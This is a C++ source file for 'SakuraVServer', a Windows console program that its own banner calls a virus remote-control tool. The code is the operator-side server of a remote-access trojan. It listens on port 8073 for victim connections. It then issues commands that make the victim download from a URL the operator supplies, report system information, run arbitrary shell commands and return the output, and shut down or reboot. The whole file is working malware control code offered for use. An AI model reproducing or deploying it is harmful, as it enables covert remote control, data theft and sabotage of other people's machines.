#include "SukuraVServer.h"

void Connect();


int main() {
	std::cout << "欢迎使用SakuraVServer" << std::endl; 
	std::cout << "作者：Commkom || 这是一款病毒远控工具 禁止用于违法用途喵 ￣へ￣" << std::endl;
	std::cout << "监听端口：8073" << std::endl;
    std::cout << "初始化中..." << std::endl;

	std::cout << std::endl;
	
	while (true) {
		Connect();
	}
	return 0;
}



void Connect() {
	WSADATA wsa;
	int r = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (r != 0) {
		std::cout << "WSAStartup failed: " << r << std::endl;
		return;
	}
	std::cout << "Winsock initialized" << std::endl;
	
	SOCKET srv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (srv == INVALID_SOCKET) {
		std::cout << "socket failed: " << WSAGetLastError() << std::endl;
		WSACleanup();
		return;
	}
	std::cout << "socket created" << std::endl;
	sockaddr_in addr = {};
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8073);
	addr.sin_addr.s_addr = INADDR_ANY;

	int b = bind(srv, (sockaddr*)&addr, sizeof(addr));
	if (b == SOCKET_ERROR) {
		std::cout << "bind failed: " << WSAGetLastError() << std::endl;
		closesocket(srv);
		WSACleanup();
		return;
	}
	std::cout << "bind ok" << std::endl;

	std::cout << "等待用户连接..." << std::endl;
	if (listen(srv, SOMAXCONN) == SOCKET_ERROR) {
		std::cout << "listen failed: " << WSAGetLastError() << std::endl;
		closesocket(srv);
		WSACleanup();
		return;
	}

	sockaddr_in clientAddr = {};
	int clientLen = sizeof(clientAddr);


	SOCKET cli = accept(srv, (sockaddr*)&clientAddr, &clientLen);
	if (cli == INVALID_SOCKET) {
		std::cout << "accept failed: " << WSAGetLastError() << std::endl;
		closesocket(srv);
		WSACleanup();
		return;
	}

	std::cout << "连接成功! 恭喜主人" << std::endl;
	std::cout << "请输入指令:" << std::endl;
    while (true) {
        std::string command;
        std::cin >> command;
        std::string recv;
        int i = 0;

        if (command == "curl") {
            std::string web;
            SendFrame(cli, "curl");
            i = RecvFrame(cli, recv);
            if (i > 0) {
                std::cout << "用户已接受指令喵" << std::endl;
                std::cout << "下载地址：";
                std::cin >> web;
                SendFrame(cli, web);
                i = RecvFrame(cli, recv);
                if (i > 0) {
                    std::cout << "用户返回：" << std::endl << recv << std::endl;
                }
                else {
                    std::cout << "用户关闭连接喵" << std::endl;
                    break;
                }
            }
        }
        else if (command == "systeminfo") {
            SendFrame(cli, "systeminfo");
            std::string recv;
            int i = RecvFrame(cli, recv);
            if (i > 0) {
                std::cout << recv << std::endl;
            }
            else if (i <= 0) {
                std::cout << "用户断开连接喵" << std::endl;
                break;
            }
        }
        else if (command == "cmd") {
            SendFrame(cli, "cmd");
            i = RecvFrame(cli, recv);
            if (i > 0) {
                std::string shell_command;
                std::string output;
                std::cout << std::endl << "用户已接受指令喵" << std::endl;
                std::cout << "命令：";
                std::cin.ignore((std::numeric_limits<std::streamsize>::max)(), '\n');
                std::getline(std::cin, shell_command);
                if (command == ""){
                    std::cout << "请勿输入空字符喵" << std::endl;
                    continue;
                }
                SendFrame(cli, shell_command);
                i = RecvFrame(cli, output);
                if (i > 0) {
                    std::cout << std::endl << output << std::endl << std::endl;
                }
                else {
                    std::cout << "用户关闭连接喵" << std::endl;
                    break;
                }
            }
            else {
                std::cout << "用户关闭连接喵" << std::endl;
                break;
            }
        }
        else if (command == "poweroff") {
            SendFrame(cli, "poweroff");
            i = RecvFrame(cli, recv);
            if (i > 0) {
                std::cout << "用户即将关机（1分钟）" << std::endl;
                break;
            }
            else if (i <= 0) {
                std::cout << "报错" << WSAGetLastError() << std::endl;
                break;
            }
        }
        else if (command == "reboot") {
            SendFrame(cli, "reboot");
            i = RecvFrame(cli, recv);
            if (i > 0) {
                std::cout << "用户即将重启（1分钟）" << std::endl;
                break;
            }
            else if (i <= 0) {
                std::cout << "报错" << WSAGetLastError() << std::endl;
                break;
            }
        }
        else {
            std::cout << "未知命令喵" << std::endl;
        }
    }
	WSACleanup();
	return;
}